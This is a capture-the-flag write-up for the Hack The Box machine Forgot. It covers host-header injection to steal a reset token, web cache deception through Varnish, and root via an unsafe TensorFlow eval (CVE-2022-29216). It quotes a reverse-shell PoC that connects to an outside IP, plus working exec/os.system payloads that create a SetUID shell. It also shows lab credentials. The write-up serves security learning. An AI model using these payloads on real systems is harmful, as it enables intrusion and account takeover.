---
title: HTB: Forgot
url: https://0xdf.gitlab.io/2023/03/04/htb-forgot.html
date: 2023-03-04T14:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: hackthebox, htb-forgot, ctf, nmap, flask, burp, burp-proxy, varnish, cache, cache-abuse, web-cache-deception, feroxbuster, ffuf, host-header-injection, htb-response, tensorflow, cve-2022-29216, command-injection
---

![Forgot](https://0xdfimages.gitlab.io/img/forgot-cover.png)

Forgot starts with a host-header injection that allows me to reset a users password and have the link sent to them be to my webserver. From there, I’ll abuse some wildcard routes and a Varnish cache to get a cached version of the admin page, which leaks SSH creds. To get to root, I’ll abuse an unsafe eval in TensorFlow in a script designed to check for XSS.

## Box Info

| Name | [Forgot](https://hackthebox.com/machines/forgot)  [Forgot](https://hackthebox.com/machines/forgot) [Play on HackTheBox](https://hackthebox.com/machines/forgot) |
| --- | --- |
| Release Date | [12 Nov 2022](https://twitter.com/hackthebox_eu/status/1590343470895730688) |
| Retire Date | 04 Mar 2023 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Forgot |
| Radar Graph | Radar chart for Forgot |
| First Blood User | 00:56:20[Sm1l3z Sm1l3z](https://app.hackthebox.com/users/357237) |
| First Blood Root | 01:46:45[DrexxKrag DrexxKrag](https://app.hackthebox.com/users/87851) |
| Creator | [MrR3boot MrR3boot](https://app.hackthebox.com/users/13531) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.188
Starting Nmap 7.80 ( https://nmap.org ) at 2023-02-20 07:05 EST
Nmap scan report for 10.10.11.188
Host is up (0.087s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.94 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.188
Starting Nmap 7.80 ( https://nmap.org ) at 2023-02-20 07:06 EST
Nmap scan report for 10.10.11.188
Host is up (0.087s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Werkzeug/2.1.2 Python/3.8.10
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/2.1.2 Python/3.8.10
|     Date: Mon, 20 Feb 2023 12:06:23 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     X-Varnish: 55446
|     Age: 0
...[snip]...
SF:%r(SIPOptions,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 143.08 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu focal 20.04.

`nmap` has a hard time identifying the HTTP server, returning the “1 service unrecognized despite returning data” and a bunch of HTTP fingerprints. Still, it does get that the server header is “Werkzeug” and “Python”, so it is Python, and very likely Flask.

### Website - TCP 80

#### Site

Visiting the website returns just a login form:

![image-20230220113626663](https://0xdfimages.gitlab.io/img/image-20230220113626663.png)

The “Forgot the password?” link leads to a form asking for a username:

![image-20230220113856144](https://0xdfimages.gitlab.io/img/image-20230220113856144.png)

If I guess admin, it returns:

![image-20230220162614109](https://0xdfimages.gitlab.io/img/image-20230220162614109.png)

If I guess 0xdf:

![image-20230220162639821](https://0xdfimages.gitlab.io/img/image-20230220162639821.png)

In theory, I can brute force valid usernames with this, though even loading it manually seems slow.

#### Tech Stack

I already know the box is likely running Flask. The 404 page confirms that with the default Flask 404 message:

![image-20230225132737784](https://0xdfimages.gitlab.io/img/image-20230225132737784.png)

Googling that message shows responses involving Flask:

![image-20230225132856963](https://0xdfimages.gitlab.io/img/image-20230225132856963.png)

Looking at the HTTP headers, I’ll note two other headers, `Via` and `X-Varnish`:

```

HTTP/1.1 200 OK
Server: Werkzeug/2.1.2 Python/3.8.10
Date: Mon, 20 Feb 2023 20:19:18 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 5186
X-Varnish: 33031
Age: 0
Via: 1.1 varnish (Varnish/6.2)
Accept-Ranges: bytes
Connection: close

```

[Varnish HTTP Cache](https://varnish-cache.org/) is a reverse proxy. That means it sits in front of the HTTP server, and caches content. It’s benefit is that it’s really fast, so for large sites it helps with speed. I’ll enumerate this more in a bit, and go into the config in [Beyond Root](#varnish-config).

Peaking at the HTML source, there is a comment on the main page in the `<head>` section just after the `<style>` block:

![image-20230220163424164](https://0xdfimages.gitlab.io/img/image-20230220163424164.png)

That gives a potential username.

The HTML page tries to load a bunch of resources from `/static`:

![image-20230223084715549](https://0xdfimages.gitlab.io/img/image-20230223084715549.png)

I don’t know why so many of them 404 (probably just sloppiness on the author / HTB’s development). These requests have additional headers:

```

HTTP/1.1 200 OK
Server: Werkzeug/2.1.2 Python/3.8.10
Date: Thu, 23 Feb 2023 13:43:53 GMT
Content-Disposition: inline; filename=5514032.js
Content-Type: application/javascript; charset=utf-8
Content-Length: 1838
Last-Modified: Sat, 09 Jul 2022 11:28:38 GMT
Date: Thu, 23 Feb 2023 13:43:53 GMT
cache-control: public, max-age=240
X-Varnish: 34150
Age: 0
Via: 1.1 varnish (Varnish/6.2)
Accept-Ranges: bytes
Connection: close

```

If I make that same request again (in Burp Repeater or `curl`), I’ll see the age and `X-Varnish` headers update:

```

HTTP/1.1 200 OK
Server: Werkzeug/2.1.2 Python/3.8.10
Date: Thu, 23 Feb 2023 13:43:53 GMT
Content-Disposition: inline; filename=5514032.js
Content-Type: application/javascript; charset=utf-8
Content-Length: 1838
Last-Modified: Sat, 09 Jul 2022 11:28:38 GMT
Date: Thu, 23 Feb 2023 13:43:53 GMT
cache-control: public, max-age=240
X-Varnish: 1464 34150
Age: 202
Via: 1.1 varnish (Varnish/6.2)
Accept-Ranges: bytes
Connection: close

```

`Age` has to do with how old the version cached in Varnish is. `X-Varnish` has to do with how Varnish is mapping the incoming requests to the requests and responses it makes to ensure the correct result it passed in response. `cache-control` also tells the browser how long it should cache the response.

At a higher level, it seems like anything in `/static` is being cached by Varnish, which makes sense. Typically you won’t cache things that are likely to change, but images and other static items make sense to cache.

#### Directory Brute Force

I’ll run `feroxbuster` against the site:

```

oxdf@hacky$ feroxbuster -u http://10.10.11.188

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.188
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.3
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      246l      484w     5186c http://10.10.11.188/
200      GET      246l      484w     5189c http://10.10.11.188/login
302      GET        5l       22w      189c http://10.10.11.188/home => http://10.10.11.188/
302      GET        5l       22w      189c http://10.10.11.188/tickets => http://10.10.11.188/
200      GET      253l      498w     5227c http://10.10.11.188/forgot
200      GET      261l      517w     5523c http://10.10.11.188/reset
[####################] - 1m     30000/30000   0s      found:6       errors:0      
[####################] - 1m     30000/30000   258/s   http://10.10.11.188/ 

```

Both `/home` and `/tickets` redirect back to the root, presumably because they require login.

`/forgot` I’ve already played with. `/reset` is new.

#### /reset

Visiting `/reset` returns another form:

![image-20230220161201834](https://0xdfimages.gitlab.io/img/image-20230220161201834.png)

If I enter a password and click “Save”, it just returns an error:

![image-20230220161234166](https://0xdfimages.gitlab.io/img/image-20230220161234166.png)

#### Username Brute Force Fail

To check for usernames, I’ll run `ffuf` with the URL `http://10.10.11.188/forgot?username=FUZZ`. One thing I don’t like about `ffuf` is that by default it only matches on certain status codes:

![image-20230220161849058](https://0xdfimages.gitlab.io/img/image-20230220161849058.png)

This is nice for directory busting, but stinks for fuzzing. I’ll add `-mc all` to turn that off.

Every response `ffuf` gets back is an error:

```

oxdf@hacky$ ffuf -u http://10.10.11.188/forgot?username=FUZZ -w /usr/share/seclists/Usernames/Names/names.txt -mc all

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.0.0                                       
________________________________________________                                                         

 :: Method           : GET                          
 :: URL              : http://10.10.11.188/forgot?username=FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Usernames/Names/names.txt
 :: Follow redirects : false                        
 :: Calibration      : false                        
 :: Timeout          : 10                           
 :: Threads          : 40                           
 :: Matcher          : Response status: all
________________________________________________

[Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 135ms]                                           
    * FUZZ: aarika                                  

[Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 146ms]                                           
    * FUZZ: abdallah                                

[Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 146ms]                                           
    * FUZZ: aaren                                   

[Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 146ms]                                           
    * FUZZ: ace                                     
...[snip]...
[Status: 503, Size: 284, Words: 51, Lines: 15, Duration: 641ms]                                          
    * FUZZ: abia                                    

[Status: 503, Size: 284, Words: 51, Lines: 15, Duration: 641ms]                                          
    * FUZZ: abu                                     

[Status: 503, Size: 284, Words: 51, Lines: 15, Duration: 641ms]                                          
    * FUZZ: abigael                                 

[Status: 503, Size: 284, Words: 51, Lines: 15, Duration: 641ms]                                          
    * FUZZ: abahri                                  

[Status: 503, Size: 283, Words: 51, Lines: 15, Duration: 641ms]                                          
    * FUZZ: abigail
...[snip]...

```

The first 20 or so are 500 errors:

![image-20230220162143220](https://0xdfimages.gitlab.io/img/image-20230220162143220.png)

Then is switches to 503:

![image-20230220162201039](https://0xdfimages.gitlab.io/img/image-20230220162201039.png)

Basically, the webserver can’t handle the flood, and then the cache takes over when it fails further.

Once the box crashes like this, visiting any site seems to show that the server is down:

![image-20230220162307122](https://0xdfimages.gitlab.io/img/image-20230220162307122.png)

Sometimes it comes back, sometimes it needs a reset.

## Shell as diego

### Site as robert-dev

#### Generate Reset

With this potential username, I’ll try resetting the password to see if (a) it’s a valid user, and (b) there’s some way I can exploit this. robert and robert-dev are not valid usernames, but robert-dev-10090 is:

![image-20230220164630149](https://0xdfimages.gitlab.io/img/image-20230220164630149.png)

robert-dev-10091 is not a valid username, but there are others that are, depending on your tun0 IP address (likely a trick put in by HTB to keep players from interacting with each other on shared labs). I could fuzz these, but I already saw how that takes down the server.

#### Host Header Injection Theory

When a website is generating a link dynamically to send to a user (like a password reset link), it is not uncommon for it to not know the domain or hostname that the site is running on. Frameworks like WordPress will have that set as a variable in the framework, but others will calculate it dynamically. Something like a ticketing system may also be serving multiple sites with the same software.

One bad way to handle this is by getting the host for the link from the Host header from the incoming request. In a general case, this will be the name of the server being interacted with. Still, there’s nothing to stop me from changing that as long as the system isn’t relying on virtual host routing to get the request.

The idea for the attack here is that I’ll submit the password reset request with the Host header set to my IP (or in the real world, a domain I control). If the site is vulnerable to host header injection, when it crafts the password reset link, it will use that host header, so the link that is sent to robert-dev-10090 has the correct path (including parameters like a token), but my host. When robert-dev-10090 clicks on the link, my webserver will get the request, including the tokens, and I can use that to reset the password.

#### Host Header Injection

I’ll send the request to `/forgot` to Burp Repeater, and edit the host header to my IP:

![image-20230221071104682](https://0xdfimages.gitlab.io/img/image-20230221071104682.png)

I’ll have a Python webserver listening to see what traffic comes back, and after a minute, there’s a request:

```

oxdf@hacky$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.188 - - [21/Feb/2023 07:11:01] code 404, message File not found
10.10.11.188 - - [21/Feb/2023 07:11:01] "GET /reset?token=lQ3%2FPfcop1Ydljq4%2FfVIQZ5xwBApktCviX0ntS7kBzBLn8teNQslJ9ZTkH3EixTEajvXes7ccIAEHJFp%2FGquYA%3D%3D HTTP/1.1" 404 -

```

Now visiting that link and updating the password works:

![image-20230221071253503](https://0xdfimages.gitlab.io/img/image-20230221071253503.png)

And I’m able to log in as Robert:

![image-20230221071333773](https://0xdfimages.gitlab.io/img/image-20230221071333773.png)

I’ll show the source code that allows this in [Beyond Root](#host-header-injection-source).

### Identify Caching Issues

#### /static

I noted above that objects in the `/static` folder seem to be eligible for caching by Varnish. There will be some kind of rule, typically matching on the URL, to define what is cached and what is not. I’ll do some tests to see if I can figure out more about that rule.

The base site does not show the `cache-control` header, where as `/static` (even when returning 404) does:

![image-20230224122329881](https://0xdfimages.gitlab.io/img/image-20230224122329881.png)

No cache for `/0xdf`, but yes for both `/static/0xdf`:

```

oxdf@hacky$ curl -I http://10.10.11.188/0xdf
HTTP/1.1 404 NOT FOUND
Server: Werkzeug/2.1.2 Python/3.8.10
Date: Thu, 23 Feb 2023 15:00:46 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 207
X-Varnish: 1573
Age: 0
Via: 1.1 varnish (Varnish/6.2)
Connection: keep-alive

oxdf@hacky$ curl -I http://10.10.11.188/static/0xdf
HTTP/1.1 404 NOT FOUND
Server: Werkzeug/2.1.2 Python/3.8.10
Date: Thu, 23 Feb 2023 14:49:37 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 207
cache-control: public, max-age=240
X-Varnish: 34314 1545
Age: 676
Via: 1.1 varnish (Varnish/6.2)
Connection: keep-alive

```

`/0xdf/static` does as well:

```

oxdf@hacky$ curl -I http://10.10.11.188/0xdf/static
HTTP/1.1 404 NOT FOUND
Server: Werkzeug/2.1.2 Python/3.8.10
Date: Thu, 23 Feb 2023 15:01:11 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 207
cache-control: public, max-age=240
X-Varnish: 1579
Age: 0
Via: 1.1 varnish (Varnish/6.2)
Connection: keep-alive

```

`/0xdfstatic` doesn’t seem to match the cache rule:

```

oxdf@hacky$ curl -I http://10.10.11.188/0xdfstatic
HTTP/1.1 404 NOT FOUND
Server: Werkzeug/2.1.2 Python/3.8.10
Date: Thu, 23 Feb 2023 15:05:35 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 207
X-Varnish: 1585
Age: 0
Via: 1.1 varnish (Varnish/6.2)
Connection: keep-alive

```

Varnish seems to be matching on the string “/static”.

#### Read /tickets Unauthed

There’s a really nice presentation called [Cached and Confused: Web Cache Deception in the Wild](https://www.usenix.org/conference/usenixsecurity20/presentation/mirheidari) from 2020 that’s worth a watch to get a lot of fun ideas about attack web caches and web cache deception attacks.

I’ll send a request for `/tickets` to Burp Repeater. This request has a cookie for a session as robert-dev-10090:

![image-20230225151220617](https://0xdfimages.gitlab.io/img/image-20230225151220617.png)

No matter how many times I send this, it always comes back with `Age: 0`, and without the `cache-control` header.

If I remove the `session` cookie from the request, it returns a 302 redirect to `/`:

![image-20230225152148023](https://0xdfimages.gitlab.io/img/image-20230225152148023.png)

If I put the cookie back, and update the URL to `/tickets/static/0xdf`, the `cache-control` header appears. On a second request, the `Age` header is non-zero:

![image-20230225152307405](https://0xdfimages.gitlab.io/img/image-20230225152307405.png)

That means the page is getting cached. If it’s being returned from the cache, I’ll try accessing it without auth. On removing the cookie, the cached version comes back:

![image-20230225152407810](https://0xdfimages.gitlab.io/img/image-20230225152407810.png)

In fact, not only does it return the page, but it’s trying to set robert-dev-10090’s session cookie! If I switch the Response mode to Render, I can see the full page, even if I shouldn’t be able to:

![image-20230225152444365](https://0xdfimages.gitlab.io/img/image-20230225152444365.png)

In my browser dev tools, I’ll clear the `session` cookie. If I visit `/tickets`, it redirects me to the login screen. However, on viewing `/tickets/static/0xdf`, not only does the page show, but it sets the cookie so I’m effectively logged in as robert-dev-10090, and can now visit other sites on the page.

### Read Admin Tickets

#### Authed Site Enumeration

The “Tickets” link shows four tickets:

![image-20230221205110333](https://0xdfimages.gitlab.io/img/image-20230221205110333.png)

There’s nothing clickable in that table. The “Escalate” link has a form:

![image-20230221205156160](https://0xdfimages.gitlab.io/img/image-20230221205156160.png)

The issue has a drop down menu with the same four tickets from the previous table. It’s a bit weird that it also needs a link to the issue, as presumably the database would know about that.

The “Tickets (escalated)” menu item isn’t clickable. Looking at the source, it has the “disabled” class:

![image-20230221205327974](https://0xdfimages.gitlab.io/img/image-20230221205327974.png)

Trying to visit `/admin_tickets` just redirects to `/home?err=ACCESS_DENIED`.

#### Wildcard /tickets Route

There’s a bunch of tickets in the table on `/tickets`, but no links to any kind of individual ticket view. I’ll try `/tickets/1`, and `/tickets/id/1` to see if I can get one, but interestingly, both return the same page as `/tickets`.

Some additional guesses with wild junk after `/tickets/` shows that `/tickets` and any path starting with `/tickets/` all load the same page (though not something like `/tickets0xdf`). I created a route like this in [Response](/2023/02/04/htb-response.html#flask-proxy-creation) when I wanted to proxy traffic. I’ll look at the source for this in [Beyond Root](#wildcard-routes).

#### Link Clicks

On the form to submit for ticket escalation, there’s a place to put a link. I’ll send a link to my webserver:

![image-20230223105503213](https://0xdfimages.gitlab.io/img/image-20230223105503213.png)

It doesn’t work, as the message at the bottom shows up saying “the link is flagged”.

The only way to get a different message seems to be to send a link to Forgot itself, which returns this message:

![image-20230223183741933](https://0xdfimages.gitlab.io/img/image-20230223183741933.png)

I have no way at this point to know if the link is clicked, but the message seems to imply it will.

#### Cache /admin\_tickets

My goal is to see the `/admin_tickets` page. If the admin page route works the same way that `/tickets` does (as in additional paths don’t matter, it loads the main page), I’ll send a link to `/admin_tickets/static/0xdf`. Having `static/` in the URL means that Varnish might cache it. If the admin views it, and it gets cached, then the next time I try to load that same path, Varnish could return the page to me even without auth.

I’ll send that link to the admin:

![image-20230223185431316](https://0xdfimages.gitlab.io/img/image-20230223185431316.png)

I’ll wait a couple minutes for the admin to click the link, making sure not to visit it myself (I want the cache empty). When I do finally visit, it returns the admin page:

![image-20230223185627852](https://0xdfimages.gitlab.io/img/image-20230223185627852.png)

I’ll notice it says “Logged In As Admin”, because that’s the page that got cached. In Burp, I’ll see the response has the cached headers, showing an age of 52 seconds earlier:

```

HTTP/1.1 200 OK
Server: Werkzeug/2.1.2 Python/3.8.10
Date: Thu, 23 Feb 2023 23:55:01 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 6923
Set-Cookie: session=5ac7151b-74c6-4bce-92e8-c85e563b66ce; HttpOnly; Path=/
cache-control: public, max-age=240
X-Varnish: 2010 35463
Age: 52
Via: 1.1 varnish (Varnish/6.2)
Accept-Ranges: bytes
Connection: close

```

I’ll dig into the config for Varnish and fix it to not allow this kind of leak in [Beyond Root](#varnish-config-1).

### SSH

The creds from the ticket work to SSH into Forgot:

```

oxdf@hacky$ sshpass -p 'dCb#1!x0%gjq' ssh diego@10.10.11.188
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-132-generic x86_64)
...[snip]...
diego@forgot:~$

```

I can read `user.txt`:

```

diego@forgot:~$ cat user.txt
aab2e15c************************

```

## Shell as root

### Enumeration

diego can run a Python script called `ml_security.py` as root:

```

diego@forgot:~$ sudo -l
Matching Defaults entries for diego on forgot:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User diego may run the following commands on forgot:
    (ALL) NOPASSWD: /opt/security/ml_security.py

```

This script is pulling all the “reason” column from the escalate table and a machine learning library [TensorFlow](https://www.tensorflow.org/) to evaluate if there’s cross site scripting present.

At the top of the script, after importing the necessary libraries, it loads models from files and defines a function (`getVec`) which sets up the features that the model will look for:

```

...[snip]...
np.random.seed(42)                                                                                       
                                                    
f1 = '/opt/security/lib/DecisionTreeClassifier.sav'
f2 = '/opt/security/lib/SVC.sav'                 
f3 = '/opt/security/lib/GaussianNB.sav'             
f4 = '/opt/security/lib/KNeighborsClassifier.sav'   
f5 = '/opt/security/lib/RandomForestClassifier.sav' 
f6 = '/opt/security/lib/MLPClassifier.sav'          
                                                                                                         
# load the models from disk                         
loaded_model1 = pickle.load(open(f1, 'rb'))  
loaded_model2 = pickle.load(open(f2, 'rb'))  
loaded_model3 = pickle.load(open(f3, 'rb'))         
loaded_model4 = pickle.load(open(f4, 'rb'))                                                              
loaded_model5 = pickle.load(open(f5, 'rb'))         
loaded_model6 = pickle.load(open(f6, 'rb'))         
model= Doc2Vec.load("/opt/security/lib/d2v.model")  
                                                    
# Create a function to convert an array of strings to a set of features
def getVec(text):                                                                                        
    features = []                                                                                        
    for i, line in enumerate(text):                                                                      
        test_data = word_tokenize(line.lower())     
        v1 = model.infer_vector(test_data) 
        featureVec = v1                             
        lineDecode = unquote(line)          
        lowerStr = str(lineDecode).lower()          
        feature1 = int(lowerStr.count('link'))
        feature1 += int(lowerStr.count('object'))
...[snip]...

```

Next it loads the data from the database:

```

...[snip]...
# Grab links                                        
conn = mysql.connector.connect(host='localhost',database='app',user='diego',password='dCb#1!x0%gjq')     
cursor = conn.cursor()                              
cursor.execute('select reason from escalate')
r = [i[0] for i in cursor.fetchall()]        
conn.close()                                        
data=[]                                                                                                  
for i in r:                                         
        data.append(i) 
...[snip]...

```

It then uses applies the model against the data and evaluates it:

```

Xnew = getVec(data)                                 
                                                    
#1 DecisionTreeClassifier                                                                                
ynew1 = loaded_model1.predict(Xnew)                                                                      
#2 SVC                                                                                                   
ynew2 = loaded_model2.predict(Xnew)                                                                      
#3 GaussianNB                                       
ynew3 = loaded_model3.predict(Xnew)        
#4 KNeighborsClassifier                             
ynew4 = loaded_model4.predict(Xnew)         
#5 RandomForestClassifier                           
ynew5 = loaded_model5.predict(Xnew)           
#6 MLPClassifier                                    
ynew6 = loaded_model6.predict(Xnew)            
                                                    
# show the sample inputs and predicted outputs   
def assessData(i):                                  
    score = ((.175*ynew1[i])+(.15*ynew2[i])+(.05*ynew3[i])+(.075*ynew4[i])+(.25*ynew5[i])+(.3*ynew6[i]))
    if score >= .5:                                 
        try:                                        
                preprocess_input_exprs_arg_string(data[i],safe=False)
        except:                                     
                pass                                
                                                    
for i in range(len(Xnew)): 
     t = threading.Thread(target=assessData, args=(i,))
#     t.daemon = True
     t.start()

```

And if it does score higher than 0.5, it sends it to `preprocess_input_exprs_arg_string`, which is imported from at the top:

```

from tensorflow.python.tools.saved_model_cli import preprocess_input_exprs_arg_string

```

### CVE-2022-29216

#### Background

I’ll try to figure out what `preprocess_input_exprs_arg_string`, Googling for the function name returns a bunch of info about CVE-2022-29216:

![image-20230224095418749](https://0xdfimages.gitlab.io/img/image-20230224095418749.png)

The top result is [this advisory](https://github.com/advisories/GHSA-75c9-jrh4-79mc), which contains a POC for a reverse shell:

```

saved_model_cli run --input_exprs 'hello=exec("""\nimport socket\nimport
subprocess\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("10.0.2.143",33419))\nsubprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())""")'
--dir ./ --tag_set serve --signature_def serving_default

```

The issue comes in `preprocess_input_exprs_arg_string`, where if it’s called with `safe=False` (like it is above), then the user input is passed to `eval`:

```

def preprocess_input_exprs_arg_string(input_exprs_str, safe=True):
...[snip]...
  for input_raw in filter(bool, input_exprs_str.split(';')):
...[snip]...
    if safe:
...[snip]...
    else:
      # ast.literal_eval does not work with numpy expressions
      input_dict[input_key] = eval(expr)  # pylint: disable=eval-used
  return input_dict

```

#### preprocess\_input\_exprs\_arg\_string

While I have all I need at this point to escalate on Forgot, I’m interested to understand what this code does, and see what changes were made to the code to patch this vulnerability.

I’ll walk through this in a [short video](https://www.youtube.com/watch?v=S3BrESgR_Gg) and in text below:

The full source for this function is [here](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/tools/saved_model_cli.py#L740-L775) in the tensorflow repo (though this is the current patched version). I’ll click “History” at the top right:

[![image-20230224100311971](https://0xdfimages.gitlab.io/img/image-20230224100311971.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20230224100311971.png)

The vulnerability was released on May 17, 2022, and the first release before that was on March 7:

[![image-20230224100415589](https://0xdfimages.gitlab.io/img/image-20230224100415589.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20230224100415589.png)

Clicking on the title there shows the diffs of two files:

[![image-20230224100524234](https://0xdfimages.gitlab.io/img/image-20230224100524234.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20230224100524234.png)

The second one is changing the tests to no longer need to test unsafe parsing. The important change is to change a call to `preprocess_input_exprs_arg_string` removing the default case of `safe=False`. This means that the user can still call it unsafely (as the author of Forgot does), but that they have to explicitly do so.

### Code Execution

#### Version

I can check the version of `tensorflow` on Forgot, and it is one of the vulnerable versions:

```

diego@forgot:~$ pip show tensorflow
Name: tensorflow
Version: 2.6.3
Summary: TensorFlow is an open source machine learning framework for everyone.
Home-page: https://www.tensorflow.org/
Author: Google Inc.
Author-email: packages@tensorflow.org
License: Apache 2.0
Location: /usr/local/lib/python3.8/dist-packages
Requires: clang, numpy, astunparse, h5py, flatbuffers, typing-extensions, wheel, tensorflow-estimator, six, termcolor, gast, protobuf, keras, absl-py, keras-preprocessing, opt-einsum, grpcio, wrapt, tensorboard, google-pasta
Required-by:

```

I don’t believe this actually matters, since `process_input_exprs_arg_string` is being called directly and explicitly as `safe=False`. This seems like a very atypical way to use `tensorflow`.

#### Exploit POC

To get this code to work, I’ll need to submit something for escalation that has both XSS and the command injection in the reason. The XSS will get scored highly by the ML model, which gets it passed to `preprocess_input_exprs_arg_string`, where the command injection will execute.

I’ll start with this:

```

oxdf=exec("""import os\nos.system("touch /tmp/0xdf")""");#<script src="http://10.10.14.6/xss.js"></script>

```

Hopefully the last bit will score highly as XSS, and then get passed to `preprocess_input_exprs_arg_string`. Then the `exec` call will import the `os` module and call `os.system`.

I’ll submit that via the webpage:

![image-20230224110524327](https://0xdfimages.gitlab.io/img/image-20230224110524327.png)

And run the script:

```

diego@forgot:~$ sudo /opt/security/ml_security.py
2023-02-24 15:55:13.863306: W tensorflow/stream_executor/platform/default/dso_loader.cc:64] Could not load dynamic library 'libcudart.so.11.0'; dlerror: libcudart.so.11.0: cannot open shared object file: No such file or directory
2023-02-24 15:55:13.863365: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.

```

`/tmp/0xdf` exists and is owned by root:

```

diego@forgot:~$ ls -l /tmp/0xdf
-rw-r--r-- 1 root root 0 Feb 24 15:54 /tmp/0xdf

```

#### Shell

I’ll modify the payload so that it creates a SetUID copy of `bash`. I’ll initially try this, but it doesn’t work:

```

oxdf=exec("""import os\nos.system("cp /bin/bash /tmp/0xdf; chmod 4777 /tmp/0xdf")""");#<script src="http://10.10.14.6/xss.js"></script>

```

When I run the script, it errors out:

```

diego@forgot:~$ sudo /opt/security/ml_security.py
2023-02-24 16:08:19.522389: W tensorflow/stream_executor/platform/default/dso_loader.cc:64] Could not load dynamic library 'libcudart.so.11.0'; dlerror: libcudart.so.11.0: cannot open shared object file: No such file or directory
2023-02-24 16:08:19.522544: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.
Traceback (most recent call last):
  File "/opt/security/ml_security.py", line 125, in <module>
    ynew1 = loaded_model1.predict(Xnew)
  File "/usr/local/lib/python3.8/dist-packages/sklearn/tree/_classes.py", line 437, in predict
    X = self._validate_X_predict(X, check_input)
  File "/usr/local/lib/python3.8/dist-packages/sklearn/tree/_classes.py", line 402, in _validate_X_predict
    X = self._validate_data(X, dtype=DTYPE, accept_sparse="csr",
  File "/usr/local/lib/python3.8/dist-packages/sklearn/base.py", line 421, in _validate_data
    X = check_array(X, **check_params)
  File "/usr/local/lib/python3.8/dist-packages/sklearn/utils/validation.py", line 63, in inner_f
    return f(*args, **kwargs)
  File "/usr/local/lib/python3.8/dist-packages/sklearn/utils/validation.py", line 637, in check_array
    raise ValueError(
ValueError: Expected 2D array, got 1D array instead:
array=[].
Reshape your data either using array.reshape(-1, 1) if your data has a single feature or array.reshape(1, -1) if it contains a single sample.

```

I’ll fix that by putting it in two `system` calls, using `\n` to separate lines:

```

oxdf=exec("""import os\nos.system("cp /bin/bash /tmp/0xdf")\nos.system("chmod 4777 /tmp/0xdf")""");#<script src="http://10.10.14.6/xss.js"></script>

```

Running the script now works, and results in a SetUID `0xdf`:

```

diego@forgot:~$ ls -l /tmp/0xdf 
-rwsrwxrwx 1 root root 1183448 Feb 24 16:09 /tmp/0xdf

```

Running it gives a root shell and the flag:

```

diego@forgot:~$ /tmp/0xdf -p
0xdf-5.0# cat /root/root.txt
be34423d************************

```

## Beyond Root

### Varnish Config

#### Identifying Process

I’m curious to see more about how Varnish works. As root, I’ll look for it in the running processes:

```

root@forgot:~# ps auxww | grep -i varnish
vcache       834  0.0  0.1  18932  5524 ?        SLs  Feb22   0:25 /usr/sbin/varnishd -j unix,user=vcache -F -a :80 -T localhost:6082 -f /etc/varnish/default.vcl -S /etc/varnish/secret -s malloc,256m            
